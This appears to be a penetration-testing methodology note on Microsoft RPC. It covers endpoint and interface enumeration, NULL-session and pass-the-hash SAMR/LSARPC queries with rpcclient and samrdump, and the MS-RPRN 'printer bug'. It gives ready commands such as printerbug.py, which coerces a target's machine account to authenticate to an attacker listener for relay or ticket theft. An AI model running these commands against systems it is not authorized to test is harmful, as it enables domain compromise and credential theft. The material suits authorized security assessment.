# MSRPC - Methodology

### Overview

The `Microsoft Remote Procedure Call (MSRPC)` protocol is a modified and
proprietary version of the `Remote Procedure Call (RPC)`. Similarly to the
`RPC` protocol, the `MSRPC` protocol implements a client-server model, in order
to allow one program, the `RCP` client, to interact with another program, the
`RPC` server, alternatively denominated service. The client and server may be
running on the same system or on two distinct and remote systems.    

Among others, the proprietary Microsoft `Distributed Component Object Model
(DCOM)` technology, used for communication between Microsoft software
components - `Component Object Model (COM)` objects - on networked computers,
extensively uses the `MSRPC` protocol as the underlying communication protocol.  

`RPC` services listen for remote procedure call requests over one, or more,
protocol-specific `endpoints`, which can either be:
  - `well-known endpoints`, pre-assigned to a stable address for a particular
    RPC service
  - `dynamic endpoints`, registered at runtime to the `RPC Endpoint Mapper
    (RpcEptMapper)` service by services and programs which need to expose a
    RPC service

The `RPC` `endpoint` structure depends on the underlying network services /
transport layer protocol in use. Microsoft defines a number of `RPC protocol
sequence strings`, that correspond to valid combinations of a `RPC` protocol,
a network layer protocol, and a transport layer protocol:
  - `ncalrpc`: local `RPC`, used for local communication between processes
  - `ncacn_ip_tcp` and `ncacn_ip_udp`: `RPC` directly over the `TCP` and `UDP`
    transport layer protocols on the `IP` protocol
  - `ncacn_np`: `RPC` over `SMB` named pipes (usually on `TCP` ports 139 or
    445)
  - `ncacn_http`: `RCP` over the `HTTP` protocol
  - `ncacn_nb_tcp` : `RPC` over `NetBIOS` (usually on `TCP` port 135)  
  - [...]

Based on the `RPC protocol sequence`, a `RPC` endpoint may take the following
format:
  - `ncalrpc:[<APPLICATION_NAME>]`
  - `ncacn_np:<IP | HOSTNAME>[\pipe\<NAMED_PIPE>]`
  / `ncacn_np:\\<IP | HOSTNAME>[\pipe\<NAMED_PIPE>]`
  - `ncacn_ip_tcp:<IP | HOSTNAME>[<TCP_PORT>]`
  - `ncacn_ip_udp:<IP | HOSTNAME>[<UDP_PORT>]`
  - `ncacn_http:<IP | HOSTNAME>[<HTTP_PORT>]`

Additionally, the `RPC` service register one, or more, `RPC` `interfaces`. An
interface corresponds to callable operations, that are offered by the `RPC`
service to the `RPC` clients, and is composed of at least an identifier `UUID`
and a version number. The list of interfaces offered by a `RPC` service is
stored in the `RPC_IF_ID_VECTOR` structure which contain an array of pointers
to `interface identifiers`, known as `IfId`.

`RPC` interfaces may also optionally specify the `well-known endpoint(s)` on
which RPC services that export the interface will listen. Otherwise, `RPC`
interfaces can be ultimately linked `dynamic endpoints` through a binding
process that occurs at run time.

Whenever accessing a `RPC` service, RPC clients rely on the `RPC Endpoint
Mapper` service to tell them which dynamic port, or ports, were assigned to the
requested RPC service. The `RPC Endpoint Mapper` service, running on `RPC`
servers as `NT AUTHORITY\NetworkService`, is accessible as an RPC service at
the following `well-known endpoints`:
  - `ncacn_ip_tcp:<IP | HOSTNAME>[135]` / `ncacn_ip_udp:<IP | HOSTNAME>[135]`  
  - `ncacn_np:<IP | HOSTNAME>[\pipe\epmapper]` (`TCP` ports 139 or 445)
  - `ncacn_http:<IP | HOSTNAME>[593]`

###### Notable Windows interfaces

Some interface `UUID` have been reserved by Microsoft and can identify RPC
interfaces associated to known Windows components. The unauthenticated
enumeration of exposed RPC interfaces can thus be used to fingerprint a machine
installed services.

| UUID | Interface | Description |
|------|-----------|-------------|
| `E1AF8308-5D1F-11C9-91A4-08002B14A0FA` | `MS-RPC-EPM` | `RPC Endpoint Mapper (RpcEptMapper)` service interface. |
| `12345778-1234-ABCD-EF00-0123456789AC` | `SAMR` | `Security Account Manager (SAM)` interface, that exposes the account database, both for local and remote domains. May be used to enumerate local and domain security principals (users and groups). |
| `12345778-1234-ABCD-EF00-0123456789AB` | `LSARPC` | The `Local Security Authority (LSA)` interface, used to manage various machine and domain security policies, such as the rights and privileges that security principals have on the machine as well as the trust relationships between domains and forests. |
| `3919286A-B10C-11D0-9BA8-00C04FD92EF5` | `LSARPC-DS` | The `LSA` `Directory Services Setup (DS)` interface, that exposes domain-related computer state and basic domain configuration information |
| `12345678-1234-ABCD-EF00-0123456789AB` | `MS-RPRN` | The `Print System Remote Protocol` interface, which defines the communication of print job processing and print system management between a print client and a print server. Can be leveraged by any authenticated user to force the machine exposing the interface to connect, with its machine account, to a remote system. |
| `1FF70682-0A51-30E8-076D-740BE8CEE98B`<br/>`378E52B0-C0A9-11CF-822D-00AA0051E40F`<br/>`86D35949-83C9-4044-B424-DB363231FD0C` | `ATSVC` | The `Task Scheduler` interface, that exposes scheduled tasks related functions. May be used to list existing tasks, query a configured task status, and configure or register tasks. |   
| `367ABB81-9844-35F1-AD32-98F038001003` | `SVCCTL` | The `Service Control Manager (SCM)` interface, that enables remote configuration and control of Windows services. |
| `4B324FC8-1670-01D3-1278-5A47BF6EE188` | `SRVSVC` | The `Server Service` interface, used for network shares related operations on the machine. |
| `338CD001-2244-31F1-AAAA-900038001003` | `MSWINREG` | The `Windows Remote Registry` interface, used for remotely managing the Windows registry. |
| `82273FDC-E32A-18C3-3F78-827929DC23EA` <br/> `F6BEAFF7-1E19-4FBB-9F8F-B89E2018337C` | `EventLog` <br/> `EventLog version 6` | The `EventLog` interface, exposes functions to interact with the Windows event logs, such as retrieving reading events and general information, such as number of records, oldest records, etc, for a specified log hive. |
| `50ABC2A4-574D-40B3-9D66-EE4FD5FBA076` | `DNSSERVER` | The `Domain Name Service (DNS) Server Management` interface, exposed on Windows machines running DNS services, in order to allow remote access and administration capacities on the DNS component. |
| `2F59A331-BF7D-48CB-9E5C-7C090D76E8B8` <br/> `5CA4A760-EBB1-11CF-8611-00A0245420ED` | `Terminal Server Service` <br/> `Terminal Services remote management` | `Terminal Server Service` (`termsrv.exe`) related interfaces, indicating that the terminal services have been deployed on the machine. |
| `3F99B900-4D87-101B-99B7-AA0004007F07` | `MS-SQL-RPC` | `Microsoft SQL Server` related RPC interface. |
| `82AD4280-036B-11CF-972C-00AA006887B0` | `Inetinfo`<br/>`MS-IIS-SMTP`<br/> | The `Internet Information Services (IIS)` `Inetinfo` interface, used to remotely manage `IIS` servers. |
| `E3514235-4B06-11D1-AB04-00C04FC2DCD2` <br/> `7C44D7D4-31D5-424C-BD5E-2B3E1F323D22` | `MS-DRSR` `DRSUAPI` <br/> `MS-DRSR` `DSAOP` | `Microsoft Active Directory Replication Service`, used for Active Directory information replication between domain controllers. |
| `1A190310-BB9C-11CD-90F8-00AA00466520` | `MS-EXCHANGE-DATABASE` | The `Microsoft Exchange Database Service` interface, used for Exchange related operations. |
| `D3FBB514-0E3B-11CB-8FAD-08002B1D29C3` <br/> `D6D70EF0-0E3B-11CB-ACC3-08002B1D29C3` <br/> `D6D70EF0-0E3B-11CB-ACC3-08002B1D29C4` | `RpcLocator` | The `RpcLocator` service interface. As the service is disabled by default on `Windows Server 2008` / `Windows Vista` machines, and later, the exposition of the `RpcLocator` interface may indicate that the machine is using an end-of-support Windows operating system. |

### Network scan and RPC services enumeration

On Microsoft Windows, `RPC` services are usually exposed on the default
dynamic ports range:
  - For `Windows Server 2008` / `Windows Vista`, and later: from ports `49152`
    through `65535`
  - For `Windows 2000`, `Windows XP`, and `Windows Server 2003`: from ports
    `1025` through `5000`

Note that a `RPC` service may also be registered as a `dynamic endpoints` on a
pre-defined port, among all available ports `1024-65355`.

`Nmap` can be used to scan the network for exposed `RPC Endpoint Mapper` RPC
services:

```
nmap -v -p 135,593 -sV -oA nmap_RpcEptMapper <RANGE | CIDR>
```

Through the `RPC Endpoint Mapper` RPC service, the details about all the RPC
services running on the host, both as `well-known endpoints` or
`dynamic endpoints`, can be enumerated. The `Nmap`'s `msrpc-enum` NSE script,
the Windows `rpctools`' `rpcdump.exe` utility and the `Impacket`'s `rpcdump.py`
`Python` script can be used to do so:

```
rpcdump.py <IP | HOSTNAME>
rpcdump.py -p <RPC_EPTMAPPER_PORT> <IP | HOSTNAME>

rpcdump.exe <IP | HOSTNAME>
# RPC_PROTCOL_SEQUENCE: ncacn_ip_tcp, ncadg_ip_udp, ncacn_np, ncacn_nb_tcp, ncacn_http, etc.
rpcdump.exe -p <RPC_PROTCOL_SEQUENCE> <IP | HOSTNAME>

nmap -v -p 135 -sV --script=msrpc-enum <IP | HOSTNAME | RANGE | CIDR>
```

If the `RPC Endpoint Mapper` RPC service is not available, or to display
interfaces information about `RPC` services that are not registered to the host
`RPC Endpoint Mapper` RPC service, the `metasploit`'s
`dcerpc/tcp_dcerpc_auditor` module and the `rpctools`' `ifids` can be used:

```
msf> use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

# RPC_PROTCOL_SEQUENCE: ncacn_ip_tcp, ncadg_ip_udp, ncacn_np, ncacn_nb_tcp, ncacn_http, etc.
ifids <RPC_EPTMAPPER_PORT> -p <PORT> <IP | HOSTNAME>
```

### Enumeration from SAMR, LSARPC, LSARPC-DS, and NETLOGON RPC services

As previously mentioned, the `SAMR`, `LSARPC`, `LSARPC-DS`, and `NETLOGON` RPC
services may be used to enumerate and manage local or domain users and groups,
retrieve basic domain information and Active Directory trusts, as well as
assign privilege(s) on the machine to specified user(s).

While access to these RPC services should normally require a valid set of
credentials, misconfiguration may allow unauthenticated binding, known as
`NULL` session. If a `NULL` session is possible on a domain controller, the
enumeration of all the security principals in the domain, as well as the domain
password policies, may be possible. As `NULL` session corresponds to a Windows
`NT AUTHORITY\ANONYMOUS LOGON`, any privileged operation, such as user and
group administration, should however be restricted.  

On Linux, the `rpcclient` utility implements a number of commands to interact
with the `SAMR`, `LSARPC`, `LSARPC-DS`, and `NETLOGON` RPC services interfaces.

```
# NULL session
rpcclient -U "" -N <IP | HOSTNAME>

# Authenticated session - with password
rpcclient -U "" <IP | HOSTNAME>

# Authenticated session - through Pass-the-Hash
rpcclient -U "" --pw-nt-hash <IP | HOSTNAME>
```

the `rpcclient` utility implements, among others, the following useful
commands:

| Command | RPC service | Description |
|---------|-------------|-------------|
| `querydominfo` | `SAMR` | Query basic domain information, such as the domain name, number of users and groups. Return AD domain information on a DC, the machine local configuration information otherwise. |
| `lsaquery` | `LSARPC` |	Return the domain name and domain SID for machine integrated in an Active Director forest. |
| `enumdomusers` | `SAMR` | Enumerate users. Returns the AD domain users on a DC, the machine local users otherwise. |
| `querydispinfo` | `SAMR` | Enumerate users and their description. Enumerates the AD domain users on a DC, the machine local users otherwise. |
| `enumdomgroups` | `SAMR` | Enumerate groups. Returns the AD domain groups on a DC, the machine local groups otherwise. |
| `samlookupnames domain <USERNAME \| USERNAMES_LIST>` | `SAMR` | Retries the RID of the domain, if the machine is a DC, or local user RID in HEX format (needed for `queryuser`). |
| `queryuser <RID>` | `SAMR` | Query the specified user (HEX RID) info. Query information of domain users on a DC, of the machine local users otherwise. |
| `lookupnames <USERNAME>` | `LSARPC` |	Retrieve the specified domain user SID for machines integrated to an Active Director forest. |
| `querygroup <RID>` | `SAMR` | Query the specified group (HEX RID) info. Query information of domain groups on a DC, of the machine local users otherwise. |
| `queryusergroups <RID>` | `SAMR` | Query the specified user (HEX RID) groups. Query information of domain users on a DC, of the machine local users otherwise. |
| `querygroupmem <RID>` | `SAMR` | Query the specified group (HEX RID) membership. Query information of domain groups on a DC, of the machine local users otherwise. |
| `getdompwinfo` | `SAMR` | Retrieve password policy information. Retrieve the domain password policy on a DC, the machine local otherwise. |
| `getusrdompwinfo <RID>` | `SAMR` | Retrieve the specified user password policy. Query information of domain users on a DC, of the machine local users otherwise. |
| `createdomuser <USERNAME>` | `SAMR` | Create a domain, if the machine is a DC, or local user. |
| `createdomgroup <GROUPNAME>` | `SAMR` | Create a domain, if the machine is a DC, or local group. |
| `deletedomuser <USERNAME>` | `SAMR` | Delete a domain, if the machine is a DC, or local, user. |
| `deletedomgroup <GROUPNAME>` | `SAMR` | Delete a domain, if the machine is a DC, or local group. |
| `chgpasswd <USERNAME> <OLD_PASS> <NEW_PASS>` | `SAMR` | Change the specified domain, if the machine is a DC, or local user password. |
| `dsroledominfo` | `LSARPC-DS` | Require `Directory Service` to be running on the machine. Can be used to determine if the remote machine is a DC. |
| `dsenumdomtrusts` | `NETLOGON` | Enumerate the trusted domains of the domain the machine is integrated to. |
| `lookupdomain <DOMAIN \| HOSTNAME>` | `SAMR` | Retrieve the domain or machine SID. |
| `enumprivs` | `LSARPC` | Enumerate the privileges of the authenticated user on the machine. |
| `lsaenumacctrights <SID>` | `LSARPC` | Enumerate the privileges of a, domain or local, security principal on the machine. |
| `lsaaddacctrights <SID> <RIGHT \| RIGHTS_LIST>` | `LSARPC` | Assign a privilege to a, domain or local, security principal on the machine. |
| `lsaremoveacctrights <SID> <RIGHT \| RIGHTS_LIST>` | `LSARPC` | Remove a privilege to a, domain or local, security principal on the machine. |

For a more automated approach, the `rpctools`' `walksam.exe` Windows utility
and the `impacket`'s `samrdump.py` Python script can be used to dump
information about each user found in the SAM database, which will contain
domain accounts information on a domain controller, local accounts information
otherwise.

```
# walksam.exe uses the current security context by default, and does provide a mechanism to specify an user

# To emulate a NULL session
runas /NetOnly /user:"DO_NOT_MATTER" cmd.exe
# To execute walksam.exe as the specified user
runas /NetOnly /user:"<WORKGROUP | DOMAIN>\<USERNAME>" cmd.exe

walksam.exe <IP | HOSTNAME>

python samrdump.py <IP | HOSTNAME>
python samrdump.py [<DOMAIN>/]<USERNAME>:<PASSWORD>@<IP | HOSTNAME>
```

### MS-RPRN "printer bug"

The `RpcRemoteFindFirstPrinterChangeNotification(Ex)` function of the
`Print System Remote Protocol`, exposed on the `MS-RPRN` `MSRPC` interface, can
be called by any domain user, member of `Authenticated Users`, to force the
machine running the `SpoolerService` to authenticate, through `NTLM` or
`Kerberos`, to the specified remote system. The authentication is conducted by
the machine using its machine account.

The authentication received on a controlled system can be captured and
exploited in a number of ways:
  - If the controlled service account (user or computer account) receiving the
  authentication is domain-joined and trusted for `Kerberos` `unconstrained
  delegation`, the `Kerberos` `service ticket`, received from the targeted
  machine as part of a `Kerberos` authentication, will contain a copy of the
  machine `Ticket-Granting Ticket (TGT)`. This `TGT` can be extracted from the
  `LSASS` process of the controlled machine, and futher used to authenticate to
  any domain resources as the targeted machine account. For more information on
  the attack, refer to the `[ActiveDirectory] Kerberos unconstrained
  delegation` note.

  - If the machine account of the machine exposing the `SpoolerService` is
  member of the local `Administrators` group of remote systems, the captured
  `NTLM` authentication can be relayed to these systems. For more information,
  refer to the `[ActiveDirectory] NTLM relaying` note. As a machine account
  password is robust, 120 `UTF16` characters, and regularly rotated, 30 days by
  default, the `Net-NTLM` hash cannot directly be cracked offline.

  - If the machine exposing the `SpoolerService` has its `LMCompatibilityLevel`
  attribute set to 2 or lower (which is usually the case for environment with
  `Windows XP` / `Windows server 2003` operating systems), the authentication
  can be downgraded to use the `NetNTLMv1` protocol. `NetNTLMv1` hashes can be
  cracked in order to retrieve the machine account `NTLM` hash, with the
  possibility of cracking `NetNTLMv1` hashes obtained with the challenge
  `1122334455667788` through a comprehensive `rainbow table` usable for free on
  `crack.sh`. The machine account `NTLM` hash can then be used to generate a
  `silver ticket` for the `HOST` service of the machine allowing for remote
  code execution. Refer to the `ActiveDirectory - NTLM capture and relay` and
  `ActiveDirectory - Kerberos Silver Tickets` notes for more information on the
  attack.

`PingCastle`'s `spooler` module, `Impacket`'s `rpcdump` Python script, and the
`Get-SpoolStatus.ps1` PowerShell script can be used to enumerate the servers
exposing the `MS-RPRN` `MSRPC` interface:

```
# Automates the enumeration of the computers in the domain and conducts the check on all the enumerated computers.
# Refer to the Active Directory - Automatic scanners note for more information on how to use PingCastle.
PingCastle.exe --scanner spooler

rpcdump.py '<DOMAIN>/<USERNAME>:<PASSWORD>@<IP | HOSTNAME> | grep -i "MS-RPRN"

Get-SpoolStatus -ComputerName <IP | HOSTNAME>
```

The `printerbug.py` Python script, of the `krbrelayx` toolkit, can be used to
call the `SpoolerService` `MSRPC` functions and trigger the authentication
callback.

```
# In order to trigger a Kerberos authentication, the listening host <LHOST_HOSTNAME> should be associated to a Service Principal Names (SPN) in the domain and a valide DNS record
# For more information, refer to the `[ActiveDirectory] Kerberos unconstrained delegation` note   

printerbug.py [<DOMAIN>/]<USERNAME>[:<PASSWORD>]@<TARGET_IP | TARGET_HOSTNAME> <LHOST_IP | LHOST_HOSTNAME>

printerbug.py -hashes <LMHASH:NTHASH> [<DOMAIN>/]<USERNAME>@<TARGET_IP | TARGET_HOSTNAME> <LHOST_IP | LHOST_HOSTNAME>
```
